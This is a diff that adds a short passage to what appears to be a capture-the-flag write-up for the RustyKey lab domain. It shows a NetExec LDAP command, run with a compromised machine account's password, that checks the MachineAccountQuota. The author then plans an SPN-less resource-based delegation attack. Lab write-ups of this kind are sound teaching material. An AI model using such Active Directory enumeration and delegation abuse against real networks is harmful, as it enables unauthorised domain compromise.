@@ -580,6 +580,18 @@ This looks like delegation abuse
 
 I do not control a computer account with an SPN set
 
+```python
+❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k -M maq
+LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! 
+MAQ         dc.rustykey.htb 389    DC               [*] Getting the MachineAccountQuota
+MAQ         dc.rustykey.htb 389    DC               MachineAccountQuota: 0
+```
+
+The machine account quota is also zero so i cannot create a computer account, this forces me to use the SPN less method
+
+https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
+
 
 
 
